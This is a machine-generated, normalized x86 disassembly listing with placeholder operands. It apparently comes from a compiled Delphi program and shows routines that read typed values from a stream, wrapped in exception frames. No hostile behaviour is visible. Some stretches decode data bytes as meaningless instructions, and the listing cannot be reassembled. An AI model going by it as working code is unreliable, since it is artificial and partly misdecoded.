mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41b08f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41ab2c
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41aba4
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41ac8c
pop ecx
push ebp
call sub_41ae3c
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41ad9c
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403b20
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41aba4
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41aba4
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b108
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40527c
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_4034e4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4175cc
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41aaf0
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_417414
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41aaf0
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_417414
sub_41b094
push ebp
call sub_41ac0c
pop ecx
test al al
je r-xdata
call sub_403a9c
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_4032e8
sub_41b11c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b18c
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41b177
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b18c
mov eax [ ebp - 0x4 ]
call sub_41a6dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a820
retn
sub_41b18c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a5c4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b694
mov eax [ ebp - 0x4 ]
call sub_41b530
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_4034e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41b24e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_4034e4
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a5c4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41aee0
mov eax [ ebp - 0x4 ]
call sub_41b530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b255
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41b25c
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41c368
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41b4e4
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41a92c
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41b2a0
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41c368
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41b4e4
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41a92c
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41b2e4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41c368
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41b4e4
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41a92c
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41b334
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41c368
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41b4e4
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41a92c
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41b378
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41c368
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41a404
mov al [ eax + lookup_table_41b39f ]
jmp [ eax * 4 + jump_table_41b3ad ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41a92c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404128
mov eax esi
call j_sub_404504
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41a92c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41b478
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41c368
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41a92c
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41a92c
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41a92c
jmp r-xdata
jmp r-xdata
call sub_41a404
sub_41b4e4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41a908
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41b478
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41c368
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41a92c
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41b538
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41a908
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41c368
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41b478
mov [ edi ] eax
sub_41b575
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b669
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404038
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4040d0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b670
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403238
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
sub_41b694
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b864
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4038b4#4
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41c18c
xor edx edx
push ebp
push j_sub_4038b4#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4042f8
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404558
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403528
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_413ed0
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403528
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_413ed0
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41ba18
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41a918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41a918
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_413f40
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41b678
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edi ebx
jmp r-xdata
sub_41b81e
add [ eax ] eax
add [ eax ] al
pop eax
jb r-xdata
rol [ ecx - 0xf140002 ] cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ edx ] ch
mov eax 0xc3890041
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a9c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_41b874
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_416f64
mov ebx eax
test ebx ebx
je r-xdata
call sub_41a404
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413fb4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b8bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419e98
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_417414
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41b8fc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41b94b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ca80
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b952
lea eax [ ebp - 0x10 ]
call sub_40edcc
retn
sub_41b958
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41ba0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41a908
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41b378
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419e98
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_417414
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c368
lea eax [ ebp - 0x4 ]
call sub_405928
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_414504
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba11
lea eax [ ebp - 0x8 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_41ba18
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bd13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd1a
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x24 ]
call sub_404718
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40405c
retn
jmp [ eax * 4 + jump_table_41baa8 ]
mov eax [ rw-data ]
call sub_41a3ec
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413f40
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a908
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a9c8
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413fb4
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41b378
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_413e6c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413fb4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b25c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414244
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41c1c8
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414144
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41c284
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414170
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c0ac
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413fb4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a908
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a908
cmp al 0xd
jne r-xdata
push ebp
call sub_41b8fc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b4e4
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4144c8
jmp r-xdata
push ebp
call sub_41b958
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413f40
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b478
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413fb4
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41b378
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41b874
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c368
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413fb4
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41b378
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c368
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414490
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c368
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413f40
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41aa20
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414490
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41b378
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41b8bc
pop ecx
jmp r-xdata
sub_41bd20
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_40408c
jmp r-xdata
mov eax [ ebx ]
call sub_4170fc
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bd80
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c09b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c168
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41c079
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41c03a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41c18c
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41c18c
mov eax [ ebp - 0x1c ]
call sub_416cd0
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41c18c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41c18c
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41bd20
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41c18c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403230
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416a20
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41bfdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_406058
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_417414
xor eax eax
push ebp
push sub_41bfbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4175cc
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfc6
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4032e8
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_417570
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41c010
call sub_4027fc
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403af0
jmp r-xdata
call sub_403a9c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41a114
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
